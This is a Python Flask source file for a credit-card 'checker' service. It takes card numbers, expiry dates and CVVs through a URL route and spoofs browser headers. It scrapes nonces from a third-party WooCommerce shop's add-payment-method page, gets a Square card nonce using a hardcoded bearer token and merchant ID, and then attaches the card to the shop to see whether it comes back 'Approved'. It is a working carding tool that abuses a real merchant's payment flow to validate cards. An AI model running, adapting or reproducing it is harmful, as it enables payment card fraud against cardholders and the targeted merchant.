from flask import Flask, jsonify
import requests
import json
from fake_useragent import UserAgent
import base64
import re
from bs4 import BeautifulSoup
import random
import string

app = Flask(__name__)

# Square API token and merchant ID (replace with your own for production)
SQUARE_API_TOKEN = "Bearer EAAAEJ2eG0hY3T2v0iPyJaNbb2ieD9Tp0d20tQkxOenoKBkhfgWN0HCGCTm1BlI9"
SQUARE_MERCHANT_ID = "ML6G63F2K7BGC"

@app.route('/gateway=square/cc=<card_details>', methods=['GET'])
def square_payment(card_details):
    try:
        # Parse card details from URL path
        card_data = card_details.split('|')
        if len(card_data) != 4:
            return jsonify({"error": "Invalid card format. Use number|exp_month|exp_year|cvv"}), 400

        card_number, exp_month, exp_year, cvv = card_data

        # Validate input
        if not all([card_number, exp_month, exp_year, cvv]):
            return jsonify({"error": "Missing required card details"}), 400

        # Normalize expiry year
        if len(exp_year) == 2:
            exp_year = f"20{exp_year}"

        # Generate random user agent
        ua = UserAgent()
        user_agent = ua.random

        # Step 1: Get client token from codeofharmony.com
        headers = {
            'authority': 'codeofharmony.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://codeofharmony.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'user-agent': user_agent,
        }

        response = requests.get('https://codeofharmony.com/my-account/add-payment-method/', headers=headers)
        if response.status_code != 200:
            return jsonify({"error": "Failed to fetch client token page"}), 500

        # Extract nonce and client token
        nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        client_token_match = re.search(r'client_token_nonce":"(.*?)"', response.text)
        if not nonce_match or not client_token_match:
            return jsonify({"error": "Failed to extract nonce or client token"}), 500

        nonce = nonce_match.group(1)
        client_token_nonce = client_token_match.group(1)

        # Step 2: Get Square client token
        headers = {
            'authority': 'codeofharmony.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://codeofharmony.com',
            'referer': 'https://codeofharmony.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user_agent,
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {'action': 'wc_square_credit_card_get_client_token', 'nonce': client_token_nonce}
        response = requests.post('https://codeofharmony.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        if response.status_code != 200 or not response.json().get('success'):
            return jsonify({"error": "Failed to get Square client token", "details": response.text}), 500

        encoded_text = response.json()['data']
        decoded_text = base64.b64decode(encoded_text).decode('utf-8')
        application_id = re.findall(r'"applicationId":"(.*?)"', decoded_text)[0]

        # Step 3: Generate Square nonce
        headers = {
            'authority': 'connect.squareup.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': SQUARE_API_TOKEN,
            'content-type': 'application/json',
            'origin': 'https://codeofharmony.com',
            'referer': 'https://codeofharmony.com/',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user_agent,
        }

        json_data = {
            'sourceId': f'cnon:{":".join([random.choice(string.ascii_letters + string.digits) for _ in range(16)])}',
            'verificationToken': None,
            'idempotencyKey': f'codeofharmony-{random.randint(100000, 999999)}',
            'card': {
                'billingAddress': {'postalCode': '10003'},
                'cardholderName': 'Test User',
                'expMonth': exp_month,
                'expYear': exp_year,
                'number': card_number,
                'cvv': cvv,
            },
            'locationId': SQUARE_MERCHANT_ID,
        }

        response = requests.post('https://connect.squareup.com/v2/card-nonces', headers=headers, json=json_data)
        if response.status_code != 200:
            return jsonify({"error": "Failed to generate Square nonce", "details": response.text}), 500

        try:
            nonce = response.json()['card_nonce']['nonce']
        except KeyError:
            return jsonify({"error": "Failed to extract nonce from Square response", "details": response.json()}), 500

        # Step 4: Add payment method
        headers = {
            'authority': 'codeofharmony.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://codeofharmony.com',
            'referer': 'https://codeofharmony.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'user-agent': user_agent,
        }

        data = {
            'payment_method': 'square_credit_card',
            'wc-square-credit-card-payment-nonce': nonce,
            'wc-square-credit-card-payment-token': '0',
            'woocommerce-add-payment-method-nonce': nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        response = requests.post('https://codeofharmony.com/my-account/add-payment-method/', headers=headers, data=data)
        if 'Payment method successfully added.' in response.text:
            return jsonify({"status": "1000: Approved"})

        # Extract error message if any
        soup = BeautifulSoup(response.text, 'html.parser')
        error_message = soup.find('div', class_='woocommerce-notices-wrapper')
        if error_message:
            return jsonify({"status": error_message.text.strip()})

        return jsonify({"status": "Unknown error occurred"})

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
